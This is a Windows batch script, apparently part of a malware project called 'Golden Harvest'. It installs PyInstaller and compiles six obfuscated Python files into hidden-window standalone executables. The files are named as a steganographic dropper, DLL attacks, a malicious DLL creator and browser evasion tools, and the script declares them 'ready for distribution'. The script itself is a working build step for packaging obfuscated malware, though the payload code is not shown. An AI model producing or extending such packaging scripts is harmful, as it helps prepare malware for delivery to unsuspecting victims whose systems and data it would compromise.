@echo off
title Creating Executables - Golden Harvest
echo 🔥 CREATING STANDALONE EXECUTABLES...
echo =======================================

REM Install PyInstaller if not installed
pip install pyinstaller

REM Create executables from obfuscated files
echo 📦 Building executables...


echo Building obf_stego_dropper.exe...
pyinstaller --onefile --windowed --name "obf_stego_dropper" "obfuscated\obf_stego_dropper.py"

echo Building obf_pure_dll_attack.exe...
pyinstaller --onefile --windowed --name "obf_pure_dll_attack" "obfuscated\obf_pure_dll_attack.py"

echo Building obf_intelligent_ai_robot.exe...
pyinstaller --onefile --windowed --name "obf_intelligent_ai_robot" "obfuscated\obf_intelligent_ai_robot.py"

echo Building obf_smart_robot_framework.exe...
pyinstaller --onefile --windowed --name "obf_smart_robot_framework" "obfuscated\obf_smart_robot_framework.py"

echo Building obf_browser_evasion.exe...
pyinstaller --onefile --windowed --name "obf_browser_evasion" "obfuscated\obf_browser_evasion.py"

echo Building obf_create_malicious_dll.exe...
pyinstaller --onefile --windowed --name "obf_create_malicious_dll" "obfuscated\obf_create_malicious_dll.py"


echo ✅ Executables created in ./dist/ directory
echo 🎯 FILES READY FOR DISTRIBUTION
pause
